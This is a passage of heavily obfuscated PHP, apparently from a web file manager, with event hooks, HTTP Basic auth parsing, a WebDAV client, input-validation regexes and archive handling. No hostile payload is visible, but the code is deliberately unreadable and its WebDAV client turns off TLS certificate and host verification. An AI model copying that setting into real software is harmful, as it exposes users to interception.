$_SERVER[ã®Â„Éæ¹¤]; if (!isset(self::$events[$c†›¤œîáå])) { self::$events[$c†›¤œîáå] = array(); } self::$events[$c†›¤œîáå][] = array($Eğ˜È¼Å£[1771] => $e›­™àƒ, $Eğ˜È¼Å£[1772] => $D†´£¦ÏÎ, $Eğ˜È¼Å£[1773] => 0); } public static function once($aÍŒòÖ·Ñ˜, $B¼Œáê˜Ü¢) { self::bind($aÍŒòÖ·Ñ˜, $B¼Œáê˜Ü¢, !0); } public static function unbind($DÈç£ÑÆÄÛ, $c£“îªõã = false) { if (!$c£“îªõã) { self::$events[$DÈç£ÑÆÄÛ] = array(); return; } $A½Œ¸®‚¹ = self::$events[$DÈç£ÑÆÄÛ]; self::$events[$DÈç£ÑÆÄÛ] = array(); if (!is_array($A½Œ¸®‚¹)) { return; } for ($b‚ôÛ’—Õ• = 0; $b‚ôÛ’—Õ• < count($A½Œ¸®‚¹); $b‚ôÛ’—Õ•++) { if ($A½Œ¸®‚¹[$b‚ôÛ’—Õ•][$_SERVER[ã®Â„Éæ¹¤][1771]] == $c£“îªõã) { continue; } self::$events[$DÈç£ÑÆÄÛ][] = $A½Œ¸®‚¹[$b‚ôÛ’—Õ•]; } } public static function filter($B­„¶­¡¨, $F˜ƒÀ×ä×á) { goto f‘Ğ†°é«; CÂ›æ¢ËÃ“: $D»ˆ¦ºµ²Ù = $C”°äˆƒ™˜[$B­„¶­¡¨]; $D³¦·‘§Î = $F˜ƒÀ×ä×á; if (!is_array($D»ˆ¦ºµ²Ù) || count($D»ˆ¦ºµ²Ù) == 0) { return $D³¦·‘§Î; } goto CèÔ†¿–; f‘Ğ†°é«: $bÖ¿Á„… =& $_SERVER[ã®Â„Éæ¹¤]; $C”°äˆƒ™˜ = self::$events; if (!isset($C”°äˆƒ™˜[$B­„¶­¡¨])) { return $F˜ƒÀ×ä×á; } goto CÂ›æ¢ËÃ“; CèÔ†¿–: for ($F¢à‡œ£®‹ = 0; $F¢à‡œ£®‹ < count($D»ˆ¦ºµ²Ù); $F¢à‡œ£®‹++) { $eŸ÷³–Æëî = $D»ˆ¦ºµ²Ù[$F¢à‡œ£®‹]; if ($eŸ÷³–Æëî[$bÖ¿Á„…[1772]] && $eŸ÷³–Æëî[$bÖ¿Á„…[1773]] > 1) { continue; } self::$events[$B­„¶­¡¨][$F¢à‡œ£®‹][$bÖ¿Á„…[1773]] = $eŸ÷³–Æëî[$bÖ¿Á„…[1773]] + 1; $D‘ìŠ“„Ë = self::apply($eŸ÷³–Æëî[$bÖ¿Á„…[1771]], array($D³¦·‘§Î)); if (gettype($D‘ìŠ“„Ë) == gettype($D³¦·‘§Î)) { $D³¦·‘§Î = $D‘ìŠ“„Ë; } } return $D³¦·‘§Î; goto e½ÃÊ–Õ„ä; e½ÃÊ–Õ„ä: } public static function trigger($e©‡ù‘µÁÛ) { goto c‡×¨óô Ø; F‡›¢ºÛšñ: $eÈÍù¼Œó = func_get_args(); array_shift($eÈÍù¼Œó); for ($C½ò¡æóªê = 0; $C½ò¡æóªê < count($B¤Œœ¬¥ô); $C½ò¡æóªê++) { $Bö½ËÃÖÚŒ = $B¤Œœ¬¥ô[$C½ò¡æóªê]; if ($Bö½ËÃÖÚŒ[$CÜç¨Îäï·[1772]] && $Bö½ËÃÖÚŒ[$CÜç¨Îäï·[1773]] > 1) { continue; } if (defined($CÜç¨Îäï·[1774]) && GLOBAL_LOG_HOOK) { write_log($e©‡ù‘µÁÛ . $CÜç¨Îäï·[1775] . $Bö½ËÃÖÚŒ[$CÜç¨Îäï·[1771]], $CÜç¨Îäï·[1776]); } self::$events[$e©‡ù‘µÁÛ][$C½ò¡æóªê][$CÜç¨Îäï·[1773]] = $Bö½ËÃÖÚŒ[$CÜç¨Îäï·[1773]] + 1; $c¾Ú‹Í¼±Œ = self::apply($Bö½ËÃÖÚŒ[$CÜç¨Îäï·[1771]], $eÈÍù¼Œó); if (defined($CÜç¨Îäï·[1774]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $CÜç¨Îäï·[1776]); if ($Bö½ËÃÖÚŒ[$CÜç¨Îäï·[1773]] == 200) { $aôÜóóŠ¿å = is_array($Bö½ËÃÖÚŒ[$CÜç¨Îäï·[1771]]) ? json_encode_force($Bö½ËÃÖÚŒ[$CÜç¨Îäï·[1771]]) : $Bö½ËÃÖÚŒ[$CÜç¨Îäï·[1771]]; write_log($CÜç¨Îäï·[1777] . $e©‡ù‘µÁÛ . $CÜç¨Îäï·[1778] . $aôÜóóŠ¿å, $CÜç¨Îäï·[1779]); } } $BòìÈŒª¥Ğ = is_null($c¾Ú‹Í¼±Œ) ? $BòìÈŒª¥Ğ : $c¾Ú‹Í¼±Œ; } goto F©ó‚êä£; c‡×¨óô Ø: $CÜç¨Îäï· =& $_SERVER[ã®Â„Éæ¹¤]; $aœ©¯ò´ô¸ = self::$events; $BòìÈŒª¥Ğ = !1; goto d·ò½´ÜÓæ; d·ò½´ÜÓæ: if (!isset($aœ©¯ò´ô¸[$e©‡ù‘µÁÛ])) { return $BòìÈŒª¥Ğ; } $B¤Œœ¬¥ô = $aœ©¯ò´ô¸[$e©‡ù‘µÁÛ]; if (!is_array($B¤Œœ¬¥ô) || count($B¤Œœ¬¥ô) == 0) { return $BòìÈŒª¥Ğ; } goto F‡›¢ºÛšñ; F©ó‚êä£: return $BòìÈŒª¥Ğ; goto bÑÉ‰Ò×Ê; bÑÉ‰Ò×Ê: } } class HttpAuth { public static function get() { $fâİëõ‘Õø =& $_SERVER[ã®Â„Éæ¹¤]; $AçÍ¶Í‹± = $fâİëõ‘Õø[33]; $DÌµĞÌÆÚæ = $fâİëõ‘Õø[33]; if (isset($_SERVER[$fâİëõ‘Õø[1780]])) { $AçÍ¶Í‹± = $_SERVER[$fâİëõ‘Õø[1780]]; $DÌµĞÌÆÚæ = $_SERVER[$fâİëõ‘Õø[1781]]; } elseif (isset($_SERVER[$fâİëõ‘Õø[1782]])) { $bá½¬—Ñ–´ = $_SERVER[$fâİëõ‘Õø[1782]]; if (strpos(strtolower($bá½¬—Ñ–´), $fâİëõ‘Õø[1783]) === 0) { $eŠ’Â‹â¥ = explode($fâİëõ‘Õø[4], base64_decode(substr($bá½¬—Ñ–´, 6))); $AçÍ¶Í‹± = isset($eŠ’Â‹â¥[0]) ? $eŠ’Â‹â¥[0] : $fâİëõ‘Õø[33]; $DÌµĞÌÆÚæ = isset($eŠ’Â‹â¥[1]) ? $eŠ’Â‹â¥[1] : 0; } } return array($fâİëõ‘Õø[536] => $AçÍ¶Í‹±, $fâİëõ‘Õø[915] => $DÌµĞÌÆÚæ); } public static function error() { goto Aó°íÏ«Ñ‚; d±ºøÍƒ: die; goto D¢ëµ­Êó; Aó°íÏ«Ñ‚: $B—ä©„Ş†« =& $_SERVER[ã®Â„Éæ¹¤]; header($B—ä©„Ş†«[1784]); header($B—ä©„Ş†«[1785]); goto AÄòçƒä»; AÄòçƒä»: header($B—ä©„Ş†«[1786]); header($B—ä©„Ş†«[1787]); header($B—ä©„Ş†«[1282]); goto d±ºøÍƒ; D¢ëµ­Êó: } public static function make($a¼ĞÓ¨Íï, $aÂİóà¾‰“) { $E™êÂ®™¥É =& $_SERVER[ã®Â„Éæ¹¤]; return $E™êÂ®™¥É[1788] + base64_encode($a¼ĞÓ¨Íï . $E™êÂ®™¥É[4] . $aÂİóà¾‰“); } } class HttpDavClient { public function __construct($fÜ¹åŒ›§, $DÜ©›„ÃôÈ, $f¦‰ÎŞ‚Ä‚) { $this->header = array(); $this->userName = $DÜ©›„ÃôÈ; $this->userPassowrd = $f¦‰ÎŞ‚Ä‚; } protected function makePath($BÉ¸ÔÎÁİ”) { return $BÉ¸ÔÎÁİ”; } protected function setHeader($bÇßÒÑİÑ», $eËƒçÓÛŒ… = false) { if ($eËƒçÓÛŒ… === !1) { $this->header[] = $bÇßÒÑİÑ»; } else { $this->header[] = $bÇßÒÑİÑ» . $_SERVER[ã®Â„Éæ¹¤][898] . $eËƒçÓÛŒ…; } } public function move($e§²íçà¢, $Fåğ¢‹ˆÊ´, $Cé•ÖîŞ† = '') { $c˜Í„˜»”˜ =& $_SERVER[ã®Â„Éæ¹¤]; $this->setHeader($c˜Í„˜»”˜[1789], $this->makePath($Fåğ¢‹ˆÊ´)); $this->setHeader($c˜Í„˜»”˜[1790], $c˜Í„˜»”˜[1791]); if ($Cé•ÖîŞ†) { $this->setHeader($c˜Í„˜»”˜[1792], $c˜Í„˜»”˜[943] . $Cé•ÖîŞ† . $c˜Í„˜»”˜[946]); } return $this->send($c˜Í„˜»”˜[1793], $e§²íçà¢); } public function copy($b…Í’Çöâ, $FÓ…µÓÁáæ) { $eÂÃ¤ùÛÀ» =& $_SERVER[ã®Â„Éæ¹¤]; $this->setHeader($eÂÃ¤ùÛÀ»[1789], $this->makePath($FÓ…µÓÁáæ)); $this->setHeader($eÂÃ¤ùÛÀ»[1790], $eÂÃ¤ùÛÀ»[1791]); return $this->send($eÂÃ¤ùÛÀ»[1794], $b…Í’Çöâ); } public function mkcol($e”×’óÍÅ) { $FÀ¾êªª— =& $_SERVER[ã®Â„Éæ¹¤]; $this->setHeader($FÀ¾êªª—[1790], $FÀ¾êªª—[1791]); return $this->send($FÀ¾êªª—[1795], $e”×’óÍÅ); } public function delete($b—´ƒ­—ˆà, $Aìô’Èó³ = '') { $F•°Š‘¨·× =& $_SERVER[ã®Â„Éæ¹¤]; if ($Aìô’Èó³) { $this->setHeader($F•°Š‘¨·×[1792], $F•°Š‘¨·×[943] . $Aìô’Èó³ . $F•°Š‘¨·×[946]); } return $this->send($F•°Š‘¨·×[1270], $b—´ƒ­—ˆà); } public function propfind($fó§îÉ–ÓÇ) { $FìŸ×²‘™ =& $_SERVER[ã®Â„Éæ¹¤]; $this->setHeader($FìŸ×²‘™[1796], $FìŸ×²‘™[83]); $this->setHeader($FìŸ×²‘™[1797], $FìŸ×²‘™[1798]); $cäª¦Ò¾Ü = $FìŸ×²‘™[1799]; return $this->send($FìŸ×²‘™[1800], $fó§îÉ–ÓÇ, $cäª¦Ò¾Ü); } public function options($bŞößá±½) { return $this->send($_SERVER[ã®Â„Éæ¹¤][1801], $bŞößá±½); } public function get($FÕ±¹£‘äò) { return $this->send($_SERVER[ã®Â„Éæ¹¤][216], $FÕ±¹£‘äò); } public function put($Fõåî±Ç•§, $BËÃ²ïÒ, $A‰•Î‹³êñ = '') { $C¤öÏ¬ôº„ =& $_SERVER[ã®Â„Éæ¹¤]; if ($A‰•Î‹³êñ) { $this->setHeader($C¤öÏ¬ôº„[1792], $C¤öÏ¬ôº„[943] . $A‰•Î‹³êñ . $C¤öÏ¬ôº„[946]); } return $this->send($C¤öÏ¬ôº„[214], $Fõåî±Ç•§, $BËÃ²ïÒ); } protected function send($d¡ßÕèÚÃ, $eÍƒ…ÂÚÇÑ, $A×³òÏ¬À = false, $b´äƒ³®¯ = false) { goto C¹âùÎàÂ; DšíÏäÜ„Ù: curl_setopt($C Ûø²Šİà, CURLOPT_HTTPHEADER, $this->header); curl_setopt($C Ûø²Šİà, CURLOPT_RETURNTRANSFER, !0); curl_setopt($C Ûø²Šİà, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto Eºß†×‰Áê; fÙ‹†äÛ´: $C Ûø²Šİà = curl_init($eÍƒ…ÂÚÇÑ); curl_setopt($C Ûø²Šİà, CURLOPT_CUSTOMREQUEST, $d¡ßÕèÚÃ); curl_setopt($C Ûø²Šİà, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto DšíÏäÜ„Ù; C¹âùÎàÂ: $bó— ½Ó›± =& $_SERVER[ã®Â„Éæ¹¤]; $Fòå‹Í¦È = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($bó— ½Ó›±[1802], $bó— ½Ó›±[50]); goto BŠ˜šÊ…Ñ×; BŠ˜šÊ…Ñ×: $this->setHeader($Fòå‹Í¦È); if ($A×³òÏ¬À) { $A×³òÏ¬À = $bó— ½Ó›±[1803] . $A×³òÏ¬À; } if (!request_url_safe($eÍƒ…ÂÚÇÑ)) { return !1; } goto fÙ‹†äÛ´; Eºß†×‰Áê: curl_setopt($C Ûø²Šİà, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($C Ûø²Šİà, CURLOPT_SSL_VERIFYHOST, !1); $a†“ğ·‚£ = curl_exec($C Ûø²Šİà); goto DØÉÃ¨Õ; DØÉÃ¨Õ: $this->header = array(); return $a†“ğ·‚£; goto dŠ×†©‡Çğ; dŠ×†©‡Çğ: } } goto f‡Û«éó—ˆ; e¿ùÇ¶Ùä¦: class Input { public static function getArray($b©ìî¿ƒö•) { goto Cğê–ĞĞ©ˆ; DÒ“¢öç†ù: if (count($AŞÙ²é‰ùÁ) > 0) { show_json(implode($aµÃ©ùŒµ[1903], $AŞÙ²é‰ùÁ), !1); } return $a¸¤Ø‡§Å£; goto dÙéÌ‚Ê¶; CšƒƒÈ‰: $AŞÙ²é‰ùÁ = array(); $eŒ°çğï‹ = LNG($aµÃ©ùŒµ[1899]); foreach ($b©ìî¿ƒö• as $D‹Æˆ×­‘  => $Eãá™’ª“) { goto C³ÃØÊÊ‘±; cá¯½çƒ¾­: if (!array_key_exists($D‹Æˆ×­‘ , $in)) { if (array_key_exists($aµÃ©ùŒµ[1901], $Eãá™’ª“)) { if (!is_null($Eãá™’ª“[$aµÃ©ùŒµ[1901]])) { $a¸¤Ø‡§Å£[$cÔ“²²‹ó] = $Eãá™’ª“[$aµÃ©ùŒµ[1901]]; } } else { if (isset($Eãá™’ª“[$aµÃ©ùŒµ[1902]])) { $AŞÙ²é‰ùÁ[] = $f®‹ªŞİ¬ƒ; } } continue; } if (isset($Eãá™’ª“[$aµÃ©ùŒµ[1902]]) && $Eãá™’ª“[$aµÃ©ùŒµ[1902]] == $aµÃ©ùŒµ[282]) { $cµ¯ó®ÑŞˆ = json_decode($in[$D‹Æˆ×­‘ ], !0); if (is_array($cµ¯ó®ÑŞˆ)) { $a¸¤Ø‡§Å£[$cÔ“²²‹ó] = $cµ¯ó®ÑŞˆ; } else { if (array_key_exists($aµÃ©ùŒµ[1901], $Eãá™’ª“)) { if (!is_null($Eãá™’ª“[$aµÃ©ùŒµ[1901]])) { $a¸¤Ø‡§Å£[$cÔ“²²‹ó] = $Eãá™’ª“[$aµÃ©ùŒµ[1901]]; } } else { $AŞÙ²é‰ùÁ[] = $f®‹ªŞİ¬ƒ; } } continue; } $c©Á¦ì»ºé = _get($Eãá™’ª“, $aµÃ©ùŒµ[1031]); goto a©ñ‡¹ö; C³ÃØÊÊ‘±: $f®‹ªŞİ¬ƒ = _get($Eãá™’ª“, $aµÃ©ùŒµ[1265], $eŒ°çğï‹ . $aµÃ©ùŒµ[898] . $D‹Æˆ×­‘ ); $cÔ“²²‹ó = $D‹Æˆ×­‘ ; if (isset($Eãá™’ª“[$aµÃ©ùŒµ[1900]]) && $Eãá™’ª“[$aµÃ©ùŒµ[1900]]) { $cÔ“²²‹ó = $Eãá™’ª“[$aµÃ©ùŒµ[1900]]; } goto cá¯½çƒ¾­; a©ñ‡¹ö: if (isset($Eãá™’ª“[$aµÃ©ùŒµ[1902]]) && !self::check($in[$D‹Æˆ×­‘ ], $Eãá™’ª“[$aµÃ©ùŒµ[1902]], $c©Á¦ì»ºé)) { if (array_key_exists($aµÃ©ùŒµ[1901], $Eãá™’ª“)) { if (!is_null($Eãá™’ª“[$aµÃ©ùŒµ[1901]])) { $a¸¤Ø‡§Å£[$cÔ“²²‹ó] = $Eãá™’ª“[$aµÃ©ùŒµ[1901]]; } } else { $AŞÙ²é‰ùÁ[] = $f®‹ªŞİ¬ƒ; } continue; } $a¸¤Ø‡§Å£[$cÔ“²²‹ó] = $in[$D‹Æˆ×­‘ ]; goto EêªÁ·—è¯; EêªÁ·—è¯: } goto DÒ“¢öç†ù; Cğê–ĞĞ©ˆ: $aµÃ©ùŒµ =& $_SERVER[ã®Â„Éæ¹¤]; global $in; $a¸¤Ø‡§Å£ = array(); goto CšƒƒÈ‰; dÙéÌ‚Ê¶: } public static function reg($EàÏÑŞŞØ = "\x72\145\x71\165\x69\162\145") { static $dñŠÑ±®ïƒ = array("\162\145\x71\x75\x69\162\145" => "\56\x2b", "\x6e\165\x6d\142\x65\162" => "\x5c\144\53", "\x69\156\x74\145\147\x65\162" => "\134\x64\53", "\150\x65\x78" => "\133\x30\x2d\x39\x41\55\106\141\x2d\x66\x5d\x2b", "\151\156\x74" => "\133\55\134\53\x5d\x3f\x5c\144\x2b", "\142\157\157\x6c" => "\x30\x7c\61", "\146\154\157\x61\x74" => "\133\55\134\53\x5d\x3f\x5c\144\53\x28\x5c\56\134\144\53\51\x3f", "\145\156\147\154\151\x73\x68" => "\133\101\55\132\141\x2d\172\x20\135\53", "\143\x68\x69\156\x65\x73\145" => "\133\x5c\170\x7b\64\x65\60\x30\x7d\55\134\170\x7b\71\146\x61\65\175\x5d\x2b", "\x68\x61\x73\103\x68\151\x6e\145\x73\145" => "\x2f\x28\133\134\x78\173\64\x65\60\60\175\x2d\134\170\173\71\146\141\x35\175\x5d\53\51\57\x75", "\145\155\141\151\x6c" => "\134\x77\x2b\x28\133\134\56\134\55\135\134\x77\x2b\x29\52\x5c\100\x5c\167\x2b\50\133\134\56\x5c\55\135\134\x77\x2b\51\x2a\x5c\56\134\x77\53", "\x70\x68\x6f\x6e\x65" => "\61\133\63\55\71\135\x5c\144\x7b\x39\175", "\x74\145\154\x70\150\157\156\145" => "\50\134\x28\134\x64\x7b\x33\54\64\x7d\x5c\x29\x7c\x5c\144\x7b\x33\54\64\x7d\55\x7c\x5c\163\x29\77\134\x64\173\x37\x2c\x31\x34\175", "\165\x72\x6c" => "\50\150\164\164\160\174\146\164\160\x7c\x68\x74\164\160\x73\x29\72\x5c\x2f\x5c\x2f\133\x5c\167\134\x2d\x5f\x5d\53\50\x5c\x2e\133\x5c\167\134\x2d\137\135\x2b\51\53\x28\x5b\x5c\167\134\55\134\x2e\54\x40\77\x5e\x3d\45\46\x3a\x5c\57\x7e\x5c\x2b\43\x5d\52\x5b\x5c\167\x5c\55\134\x40\x3f\136\x3d\x25\x26\134\x2f\x7e\134\53\x23\135\x29\x3f", "\165\162\x6c\106\165\154\x6c" => "\x5b\141\x2d\x7a\101\55\172\x5d\53\x3a\134\x2f\x5c\57\133\136\x5c\x73\135\x2a", "\x69\160" => "\x28\x5c\x64\173\61\x2c\63\175\134\x2e\51\x7b\63\175\x28\x5c\144\173\x31\x2c\63\175\x29", "\x7a\151\160" => "\133\x31\x2d\71\135\134\x64\x7b\x35\175\x28\77\41\134\x64\51", "\151\x64\103\x61\162\x64" => "\50\x5c\x64\173\x31\65\175\x29\174\x28\134\144\x7b\61\x37\x7d\x28\x5c\x64\x7c\x58\174\x78\51\x29", "\143\157\154\157\x72" => "\43\x28\133\x30\55\x39\x41\x2d\106\x61\55\146\135\x7b\63\x7d\x7c\133\60\x2d\71\x41\x2d\106\141\55\146\x5d\x7b\x36\x7d\51", "\164\151\155\145" => "\50\133\x30\x2d\x31\x5d\x5c\x64\174\62\133\x30\x2d\64\135\x29\72\x5b\60\x2d\x35\135\x5c\x64", "\x64\x61\164\x65" => "\x5c\x64\173\64\x7d\x5b\55\134\57\x5d\x3f\50\x30\133\61\x2d\x39\x5d\x7c\61\x5b\60\x2d\62\135\51\x5b\55\x5c\x2f\x5d\x3f\50\x5b\x30\x2d\62\135\x5c\x64\x7c\63\133\x30\x2d\x31\x5d\x29", "\144\141\x74\x65\124\151\x6d\x65" => "\x5c\x64\173\64\x7d\133\x2d\x5c\x2f\x5d\77\50\x30\x5b\x31\55\x39\x5d\174\x31\133\60\x2d\x32\x5d\x29\133\x2d\x5c\57\135\x3f\x28\133\x30\55\62\x5d\x5c\x64\174\63\133\60\55\61\x5d\x29\x5c\x73\53\x28\133\x30\55\x31\135\134\x64\174\62\133\x30\x2d\x34\135\51\x3a\133\x30\55\x35\135\x5c\x64", "\160\141\163\163\x77\x6f\162\x64" => "\50\x3f\x3d\x2e\52\134\x64\51\50\77\75\x2e\52\x5b\141\55\x7a\135\x29\50\77\75\56\x2a\x5b\101\55\132\x5d\x29\56\x7b\70\x2c\62\60\175", "\x6b\x65\171" => "\x5b\x41\55\132\x61\x2d\172\x30\x2d\71\137\x5c\55\134\56\135\53", "\153\145\x79\x46\x75\154\x6c" => "\x5b\101\55\132\141\x2d\172\x30\55\71\137\x5c\55\x5c\x2e\134\x73\54\135\53"); if (!$EàÏÑŞŞØ) { return $dñŠÑ±®ïƒ; } return $dñŠÑ±®ïƒ[$EàÏÑŞŞØ]; } public static function check($d½¯ø•«ëô, $bŒŠÂÆ²â¹, $b¡’„°¯âƒ = null) { $eî‰ñäÁ¹È =& $_SERVER[ã®Â„Éæ¹¤]; switch ($bŒŠÂÆ²â¹) { case $eî‰ñäÁ¹È[7]: return in_array($d½¯ø•«ëô, $b¡’„°¯âƒ); break; case $eî‰ñäÁ¹È[1904]: return floatval($d½¯ø•«ëô) > $b¡’„°¯âƒ; break; case $eî‰ñäÁ¹È[1905]: return floatval($d½¯ø•«ëô) < $b¡’„°¯âƒ; break; case $eî‰ñäÁ¹È[325]: return strlen($d½¯ø•«ëô) >= $b¡’„°¯âƒ[0] && strlen($d½¯ø•«ëô) <= $b¡’„°¯âƒ[1]; break; case $eî‰ñäÁ¹È[325]: if (is_array($b¡’„°¯âƒ)) { return strlen($d½¯ø•«ëô) >= $b¡’„°¯âƒ[0] && strlen($d½¯ø•«ëô) <= $b¡’„°¯âƒ[1]; break; } else { return strlen($d½¯ø•«ëô) == $b¡’„°¯âƒ; break; } case $eî‰ñäÁ¹È[321]: return floatval($d½¯ø•«ëô) >= $b¡’„°¯âƒ[0] && floatval($d½¯ø•«ëô) <= $b¡’„°¯âƒ[1]; break; } $F±÷¿ŠßÅÆ = self::reg(!1); $bŒŠÂÆ²â¹ = isset($F±÷¿ŠßÅÆ[$bŒŠÂÆ²â¹]) ? $F±÷¿ŠßÅÆ[$bŒŠÂÆ²â¹] : $bŒŠÂÆ²â¹; if (substr($bŒŠÂÆ²â¹, 0, 1) != $eî‰ñäÁ¹È[8]) { $bŒŠÂÆ²â¹ = $eî‰ñäÁ¹È[1906] . $bŒŠÂÆ²â¹ . $eî‰ñäÁ¹È[1907]; } return preg_match($bŒŠÂÆ²â¹, $d½¯ø•«ëô) === 1; } public static function get($Fá‚â÷¨Ô§, $A¥°—Õ„šæ = null, $BµŒ‹ë™ãª = null, $aó’ğíÁÜÍ = null) { goto C¯‚ØŒ¸ïµ; cˆóÁ…›íê: return $bíã²å£[$Fá‚â÷¨Ô§]; goto fŸß¬ºäˆê; f¬…ì—ù¿: if (!is_null($aó’ğíÁÜÍ)) { $aË§®“ğ‡¨[$D»¼ÚÆƒ†œ[1031]] = $aó’ğíÁÜÍ; } if (!is_null($A¥°—Õ„šæ)) { $aË§®“ğ‡¨[$D»¼ÚÆƒ†œ[1902]] = $A¥°—Õ„šæ; } $bíã²å£ = Input::getArray(array($Fá‚â÷¨Ô§ => $aË§®“ğ‡¨)); goto cˆóÁ…›íê; C¯‚ØŒ¸ïµ: $D»¼ÚÆƒ†œ =& $_SERVER[ã®Â„Éæ¹¤]; $aË§®“ğ‡¨ = array(); if (!is_null($BµŒ‹ë™ãª)) { $aË§®“ğ‡¨[$D»¼ÚÆƒ†œ[34]] = $BµŒ‹ë™ãª; } goto f¬…ì—ù¿; fŸß¬ºäˆê: } } class KodArchive { static function init() { goto BÆ±õÍ„Ö¿; FË‡İ‘•İ‡: require_once ARCHIVE_LIB . $bŞ×Ã²ƒ‰[1916]; require_once ARCHIVE_LIB . $bŞ×Ã²ƒ‰[1917]; require_once ARCHIVE_LIB . $bŞ×Ã²ƒ‰[1918]; goto A¢…ƒ”êÒ’; fØ«…‹ùÔŠ: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $bŞ×Ã²ƒ‰[1914]; require_once ARCHIVE_LIB . $bŞ×Ã²ƒ‰[1915]; goto FË‡İ‘•İ‡; bŒö«¶ÁÛ¶: define($bŞ×Ã²ƒ‰[1910], TEMP_FILES); define($bŞ×Ã²ƒ‰[1911], TEMP_FILES); define($bŞ×Ã²ƒ‰[1912], $bŞ×Ã²ƒ‰[1913]); goto fØ«…‹ùÔŠ; A¢…ƒ”êÒ’: require_once ARCHIVE_LIB . $bŞ×Ã²ƒ‰[1919]; goto Cµâ¶ì‹¶; BÆ±õÍ„Ö¿: $bŞ×Ã²ƒ‰ =& $_SERVER[ã®Â„Éæ¹¤]; if (defined($bŞ×Ã²ƒ‰[1908])) { return; } define($bŞ×Ã²ƒ‰[1908], SDK_DIR . $bŞ×Ã²ƒ‰[1909]); goto bŒö«¶ÁÛ¶; Cµâ¶ì‹¶: } static function checkIfType($eæ¬½òæš, $EÑ“ÇÎÃí) { goto E†ŒÎĞÄÓà; DÏç•Öß¾å: $BÌ†µ¬¤½  = in_array($eæ¬½òæš, $f¿¾Š„öÎ”[$EÑ“ÇÎÃí]); if ($BÌ†µ¬¤½  && ($EÑ“ÇÎÃí == $E„¡Ù†æ˜¾[301] || $EÑ“ÇÎÃí == $E„¡Ù†æ˜¾[1923]) && (!function_exists($E„¡Ù†æ˜¾[1931]) || !function_exists($E„¡Ù†æ˜¾[1932]))) { show_tips($E„¡Ù†æ˜¾[1933]); } if ($BÌ†µ¬¤½  && $EÑ“ÇÎÃí == $E„¡Ù†æ˜¾[1064] && (!function_exists($E„¡Ù†æ˜¾[1934]) || !strstr(shell_exec($E„¡Ù†æ˜¾[1935]), $E„¡Ù†æ˜¾[1936]))) { show_tips($E„¡Ù†æ˜¾[1937]); } goto eÄ—ˆßã‘; eÄ—ˆßã‘: return $BÌ†µ¬¤½ ; goto D¡……æ°áÇ; E†ŒÎĞÄÓà: $E„¡Ù†æ˜¾ =& $_SERVER[ã®Â„Éæ¹¤]; self::init(); $f¿¾Š„öÎ” = array($E„¡Ù†æ˜¾[301] => array($E„¡Ù†æ˜¾[301], $E„¡Ù†æ˜¾[1920], $E„¡Ù†æ˜¾[1921], $E„¡Ù†æ˜¾[1922]), $E„¡Ù†æ˜¾[1923] => array($E„¡Ù†æ˜¾[1923], $E„¡Ù†æ˜¾[1924], $E„¡Ù†æ˜¾[1062], $E„¡Ù†æ˜¾[1060]), $E„¡Ù†æ˜¾[1064] => array($E„¡Ù†æ˜¾[1064], $E„¡Ù†æ˜¾[1925], $E„¡Ù†æ˜¾[1926], $E„¡Ù†æ˜¾[1927], $E„¡Ù†æ˜¾[1928], $E„¡Ù†æ˜¾[1929], $E„¡Ù†æ˜¾[1930])); goto DÏç•Öß¾å; D¡……æ°áÇ: } static function listContent($C¥ç’Á”øë, $DÎ¬“Ùë§’ = true) { $B¥‹Ô¤´ø¾ =& $_SERVER[ã®Â„Éæ¹¤]; self::init(); $F‹ö•½÷Ÿ‘ = !empty($GLOBALS[$B¥‹Ô¤´ø¾[1068]]) ? $GLOBALS[$B¥‹Ô¤´ø¾[1068]] : get_path_ext($C¥ç’Á”øë); $FÓÕÆ©É£ù = !1; if (self::checkIfType($F‹ö•½÷Ÿ‘, $B¥‹Ô¤´ø¾[1923])) { $EìİåßÀ¾ = PclTarList($C¥ç’Á”øë, $F‹ö•½÷Ÿ‘); $FÓÕÆ©É£ù = array(); for ($bø™çğšÅ = 0; $bø™çğšÅ < count($EìİåßÀ¾); $bø™çğšÅ++) { $e””é²£Œ = $EìİåßÀ¾[$bø™çğšÅ]; if ($e””é²£Œ[$B¥‹Ô¤´ø¾[1938]] == $B¥‹Ô¤´ø¾[1939] || $e””é²£Œ[$B¥‹Ô¤´ø¾[1938]] == $B¥‹Ô¤´ø¾[1940]) { continue; } if ($DÎ¬“Ùë§’) { $e””é²£Œ[$B¥‹Ô¤´ø¾[1941]] = ltrim($e””é²£Œ[$B¥‹Ô¤´ø¾[1941]], $B¥‹Ô¤´ø¾[1174]); } if ($e””é²£Œ[$B¥‹Ô¤´ø¾[1938]] == $B¥‹Ô¤´ø¾[1942]) { $e””é²£Œ[$B¥‹Ô¤´ø¾[76]] = !0; } else { $e””é²£Œ[$B¥‹Ô¤´ø¾[76]] = !1; } $e””é²£Œ[$B¥‹Ô¤´ø¾[1055]] = $bø™çğšÅ; $FÓÕÆ©É£ù[] = $e””é²£Œ; } } else { if (self::checkIfType($F‹ö•½÷Ÿ‘, $B¥‹Ô¤´ø¾[1064])) { $bôÍ‘ë¸æß = kodRarArchive::listContent($C¥ç’Á”øë); if (!$bôÍ‘ë¸æß[$B¥‹Ô¤´ø¾[1051]]) { return $bôÍ‘ë¸æß; } else { $FÓÕÆ©É£ù = $bôÍ‘ë¸æß[$B¥‹Ô¤´ø¾[1053]]; } } else { if (kodZipArchive::support($B¥‹Ô¤´ø¾[354])) { $FÓÕÆ©É£ù = kodZipArchive::listContent($C¥ç’Á”øë); } else { $FØƒ‚§¼± = new PclZip($C¥ç’Á”øë); $FÓÕÆ©É£ù = $FØƒ‚§¼±->listContent(); } } } if ($FÓÕÆ©É£ù) { $a‘öª·çÉá = unzip_charset_get($FÓÕÆ©É£ù); $DÎ¬“Ùë§’ = $DÎ¬“Ùë§’ && function_exists($B¥‹Ô¤´ø¾[65]); for ($bø™çğšÅ = 0; $bø™çğšÅ < count($FÓÕÆ©É£ù); $bø™çğšÅ++) { $FÓÕÆ©É£ù[$bø™çğšÅ][$B¥‹Ô¤´ø¾[1941]] = str_replace(array($B¥‹Ô¤´ø¾[1091], $B¥‹Ô¤´ø¾[1943]), $B¥‹Ô¤´ø¾[786], $FÓÕÆ©É£ù[$bø™çğšÅ][$B¥‹Ô¤´ø¾[1941]]); if ($DÎ¬“Ùë§’) { 